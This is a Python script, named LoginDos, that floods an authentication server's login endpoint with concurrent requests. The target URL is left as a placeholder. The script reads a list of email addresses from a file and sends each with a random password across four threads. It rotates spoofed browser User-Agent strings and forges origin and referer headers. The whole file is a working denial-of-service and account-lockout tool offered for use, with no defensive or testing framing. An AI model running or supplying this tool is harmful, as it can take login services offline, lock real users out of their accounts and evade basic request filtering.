import aiohttp
import asyncio
import random
import string
import argparse
import os
import threading

class LoginDos:
    user_agents = ['Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51']

    url = "{auth_server_login_url_you_wanna_attack}"

    def __init__(self, email_list):
        self.email_list = email_list

    async def login(self, session, email, password, headers):
        json = {"email": email, "password": password}
        async with session.post(LoginDos.url, json=json, headers=headers) as response:
            print(response.status, json) 
        
    async def execute(self):
        async with aiohttp.ClientSession() as session:
            futures = []
            for email in self.email_list:
                futures.append(asyncio.create_task(self.login(session, email, self.__randomly_generate_password(), self.__make_headers())))
            await asyncio.gather(*futures)

    def DOS(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        asyncio.run(self.execute())
        loop.close()

    def __make_headers(self):
        headers = {"Content-Type":"application/json"}
        headers['User-Agent'] = random.choice(LoginDos.user_agents)
        headers['accept'] = 'application/json'
        headers['accept-encoding'] = 'gzip, deflate, br'
        headers['origin'] = '{service_url_that_requests_login_api_at_auth_server}'
        headers['referer'] = '{service_url_that_requests_login_api_at_auth_server}'
        return headers

    def __randomly_generate_password(self):
        return ''.join(random.choice(string.ascii_letters) for _ in range(random.randrange(7, 13)))

class WorkerThread(threading.Thread):
    def __init__(self, email_list):
        super().__init__()
        self.dos = LoginDos(email_list)

    def run(self):
        self.dos.DOS()

def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--file', default='email.txt', help='filename for emails')
    return parser.parse_args()
    
def load_emails(email_file):
    email_list = []
    with open(email_file, 'r') as f:
        while True:
            line = f.readline()
            if not line:
                break
            email = line.strip()
            email_list.append(email)
    return email_list

if __name__ == "__main__":
    args = parse()
    email_list = load_emails(args.file)

    # nthreads = os.cpu_count()
    nthreads = 4
    threads = [WorkerThread(email_list) for i in range(nthreads)]

    for t in threads:
        t.start()
    for t in threads:
        t.join()
